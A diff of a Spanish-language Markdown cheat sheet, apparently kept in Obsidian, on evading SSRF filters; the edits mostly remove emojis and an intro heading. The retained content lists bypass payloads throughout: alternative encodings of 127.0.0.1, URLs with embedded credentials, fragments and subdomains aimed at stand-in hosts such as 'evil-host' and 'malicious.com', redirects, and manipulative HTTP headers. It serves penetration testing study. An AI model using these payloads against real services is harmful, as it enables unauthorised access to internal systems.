@@ -4,38 +4,32 @@
 
 ---
 ---
-## **Técnicas para Circunventar Filtros SSRF**
-
-Algunas aplicaciones bloquean entradas comunes como `127.0.0.1` o `localhost`. Aquí hay técnicas para eludir estos filtros:
-
----
-
 ### **1. Usar Representación Alternativa de IP**
 Representaciones de la IP `127.0.0.1`:
 - **Decimal:** `2130706433`
-- 🔢 **Octal:** `017700000001`
-- 📝 **Forma abreviada:** `127.1`
+- **Octal:** `017700000001`
+- **Forma abreviada:** `127.1`
 
 ---
 
-### 🏷️ **2. Registrar un Dominio Controlado**
+### **2. Registrar un Dominio Controlado**
 Registra un dominio propio que resuelva a `127.0.0.1` para realizar pruebas o explotar la vulnerabilidad:  
 - Ejemplo: `spoofed.burpcollaborator.net`
 
 ---
 
-### 📝 **3. Ofuscar Cadenas Bloqueadas**
-- 🔒 **URL Encoding:** Convertir caracteres especiales. Ejemplo:  
+### **3. Ofuscar Cadenas Bloqueadas**
+- **URL Encoding:** Convertir caracteres especiales. Ejemplo:  
   ```
   /admin → %2Fadmin
   ```
-- 🔀 **Case Variation:** Cambiar entre mayúsculas y minúsculas:  
+- **Case Variation:** Cambiar entre mayúsculas y minúsculas:  
   ```
   /Admin → /admin
   ```
 ---
 
-### 🔁 **4. Usar Redirecciones**
+### **4. Usar Redirecciones**
 Configura una redirección en un dominio controlado para apuntar a la URL objetivo.  
 - **Entrada del usuario:**  
   ```
@@ -47,9 +41,9 @@ Configura una redirección en un dominio controlado para apuntar a la URL objeti
   ```
 ---
 
-## 🗝️ **Técnicas de Evasión Adicionales**
+## **Técnicas de Evasión Adicionales**
 
-### 📝 **Embedding Credentials en la URL**
+### **Embedding Credentials en la URL**
 Se pueden incrustar credenciales dentro de la URL usando `@`:  
 ```http
 https://expected-host:fakepassword@evil-host
@@ -58,7 +52,7 @@ https://expected-host:fakepassword@evil-host
 
 ---
 
-### 🚀 **Uso del Carácter `#` para Fragmentos**
+### **Uso del Carácter `#` para Fragmentos**
 El carácter `#` indica el inicio de un fragmento, que **no es enviado al servidor**:  
 ```http
 https://evil-host#expected-host
@@ -67,7 +61,7 @@ https://evil-host#expected-host
 
 ---
 
-### 🌐 **Jerarquía de Nombres de Dominio**
+### **Jerarquía de Nombres de Dominio**
 El atacante puede usar el nombre de host como subdominio de un dominio controlado:  
 ```http
 https://expected-host.evil-host
@@ -76,9 +70,9 @@ https://expected-host.evil-host
 
 ---
 
-## 🛡️ **Ejemplos Prácticos**
+## **Ejemplos Prácticos**
 
-### 📝 **1. Embedding Credentials:**
+### **1. Embedding Credentials:**
 ```http
 https://example.com?url=https://internal-service:fakepassword@malicious.com
 ```
@@ -86,7 +80,7 @@ https://example.com?url=https://internal-service:fakepassword@malicious.com
 
 ---
 
-### 💥 **2. Uso de Fragmento en la URL:**
+### **2. Uso de Fragmento en la URL:**
 ```http
 https://example.com?url=https://malicious.com#internal-service
 ```
@@ -94,7 +88,7 @@ https://example.com?url=https://malicious.com#internal-service
 
 ---
 
-### 🔍 **3. Jerarquía de Dominio (DNS Naming Hierarchy):**
+### **3. Jerarquía de Dominio (DNS Naming Hierarchy):**
 ```http
 https://example.com?url=https://internal-service.malicious.com
 ```
@@ -102,7 +96,7 @@ https://example.com?url=https://internal-service.malicious.com
 
 ---
 
-## 🗂️ **Cabeceras HTTP para Evasión de SSRF**
+## **Cabeceras HTTP para Evasión de SSRF**
 Algunas cabeceras útiles para intentar redirigir o manipular la solicitud:
 
 ```http
@@ -134,4 +128,3 @@ Surrogate-Capability: attacker="Surrogate/1.0"
 
 ---
 
-💾 **Guarda esta referencia en Obsidian para tener siempre a mano tus técnicas de SSRF!** 🚀
